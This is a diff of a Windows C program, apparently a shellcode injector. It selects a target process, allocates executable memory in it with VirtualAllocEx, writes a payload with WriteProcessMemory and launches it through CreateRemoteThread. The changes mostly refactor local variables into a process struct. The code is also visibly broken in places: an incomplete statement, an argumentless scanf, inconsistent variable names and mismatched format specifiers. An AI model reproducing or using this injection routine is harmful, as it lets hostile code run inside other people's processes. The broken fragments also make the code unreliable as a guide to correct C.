@@ -11,7 +11,7 @@ void	printListInfos(t_list_infos *list) {
 }
 
 void	printProcessInfos(t_pinfo process) {
-	printf("Process id: %d\n Process Handle: 0x%p\n Time64: %lld", process.pid, process.Hprocess, process.time64);
+	printf("Process id: %d\n Process Handle: 0x%p\n Time64: %lld\n", process.pid, process.Hprocess, process.time64);
 }
 
 
@@ -106,6 +106,7 @@ int		main(int argc, char** argv) {
 	int pid = currentProcessesList->choosenProcess->pid;
 
 	printProcessInfos(currentProcessList->choosenProcess);
+	printf("Press anything to complete !\n");
 	scanf();
 
 	// PROCESS_CREATE_THREAD|PROCESS_VM_WRITE|PROCESS_VM_OPERATION
@@ -115,40 +116,59 @@ int		main(int argc, char** argv) {
 	// 	return EXIT_FAILURE;
 	// }
 
-	LPVOID VMPointer = NULL;
+	currentProcessesList->choosenProcess->VMPointer = NULL;
 
-	if (!(VMPointer = VirtualAllocEx(currentProcessesList->choosenProcess->HProcess, NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE))) {
+	if (!(currentProcessesList->choosenProcess->VMPointer = VirtualAllocEx(
+			currentProcessesList->choosenProcess->HProcess,
+			NULL,
+			payloadSize,
+			MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
+		))) {
 		printf("Couldn't reserve/alloc memory in process virtualAddress, Error code %lx\n", GetLastError());
 		return EXIT_FAILURE;
 	}
 
-	printf("HProcess : 0x%p\nVMPointer : 0x%p\n", currentProcessesList->choosenProcess->HProcess, VMPointer);
+	printf("HProcess : 0x%p\nVMPointer : 0x%p\n", currentProcessesList->choosenProcess->HProcess, currentProcessesList->choosenProcess->VMPointer);
 
-	SIZE_T dataWritten = 0;
-	boolean wasDelivered = FALSE;
+	currentProcessesList->choosenProcess->dataWritten = 0;
+	currentProcessesList->choosenProcess->wasDelivered = FALSE;
 
-	if (!(wasDelivered = WriteProcessMemory(currentProcessesList->choosenProcess->HProcess, VMPointer, payload, payloadSize, &dataWritten))) {
+	if (!(currentProcessesList->choosenProcess->wasDelivered = WriteProcessMemory(
+			currentProcessesList->choosenProcess->HProcess,
+			currentProcessesList->choosenProcess->VMPointer,
+			payload,
+			payloadSize,
+			&(currentProcessesList->choosenProcess->dataWritten)
+		))) {
 		printf("Couldn't deliver the playload, Error code %lx\n", GetLastError());
 		// need to brut-force !
 		return EXIT_FAILURE;
 	}
 
-	if (dataWritten != payloadSize) {
-		printf("Payload wasn't written in its entirety, payloadSize: %ud, dataWritten: %ud\n", payloadSize, dataWritten);
+	if (currentProcessesList->choosenProcess->dataWritten != payloadSize) {
+		printf("Payload wasn't written in its entirety, payloadSize: %ud, dataWritten: %ud\n", payloadSize, currentProcessesList->choosenProcess->dataWritten);
 	}
 	
-	printf("payloadSize: %zu, dataWritten: %zu\n", payloadSize, dataWritten);
+	printf("payloadSize: %zu, dataWritten: %zu\n", payloadSize, currentProcessesList->choosenProcess->dataWritten);
 
-	HANDLE HThread = NULL;
+	currentProcessesList->choosenProcess->HThread = NULL;
 
-	DWORD dwThreadId = 0;
+	currentProcessesList->choosenProcess->dwThreadId
 
-	if (!(HThread = CreateRemoteThread(currentProcessesList->choosenProcess->HProcess, NULL, 0, (LPTHREAD_START_ROUTINE)VMPointer, NULL, 0, &dwThreadId))) {
+	if (!(currentProcessesList->choosenProcess->HThread = CreateRemoteThread(
+			currentProcessesList->choosenProcess->HProcess,
+			NULL,
+			0,
+			(LPTHREAD_START_ROUTINE)currentProcessesList->choosenProcess->VMPointer,
+			NULL,
+			0,
+			&(currentProcessesList->choosenProcess->dwThreadId)
+		))) {
 		printf("Couldn't summon a thread. to execute the payload, %lx\n", GetLastError());
 		return EXIT_FAILURE;
 	}
 
-	printf("Thread was summoned correctly with id : %ud\n", dwThreadId);
+	printf("Thread was summoned correctly with id : %ud\n", currentProcessesList->choosenProcess->dwThreadId);
 
 	return EXIT_SUCCESS; 
 }
